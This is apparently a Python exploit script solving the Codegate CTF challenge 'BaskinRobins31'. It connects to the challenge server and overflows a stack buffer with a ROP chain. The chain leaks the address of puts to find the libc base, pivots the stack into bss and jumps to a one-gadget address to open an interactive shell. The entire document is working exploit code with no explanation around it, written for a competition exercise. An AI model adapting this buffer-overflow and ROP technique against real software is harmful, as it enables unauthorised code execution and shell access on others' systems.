from ntpwn import *


e = ELF('./BaskinRobins31')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
s = remote('ch41l3ng3s.codegate.kr', 3131)
'''
s = process('./BaskinRobins31') 
b = BP(s)
b.bp('c')
b.done()

'''

prdi = 0x0000000000400bc3
pr3 = 0x000000000040087a
prbp = 0x00000000004007e0
leaveret = 0x0000000000400979

pause()
s.recvuntil('-3)\n')

payload = 'A' * 0xb0
payload += 'C' * 8
payload += p64(prdi) + p64(e.got['puts']) + p64(e.plt['puts'])
payload += p64(pr3) + p64(0) + p64(e.bss()) + p64(0x50) + p64(e.plt['read'])
payload += p64(prbp) + p64(e.bss() - 8) + p64(leaveret)


s.sendline(payload)

s.recvuntil('s...:( \n')
libc_base = u64(s.recv(6) + "\x00" * 2) - l.symbols['puts']
print hex(libc_base)

payload = p64(libc_base +l.symbols['system'])
payload = p64(libc_base + 0x4526a)
s.sendline(payload)

s.interactive()
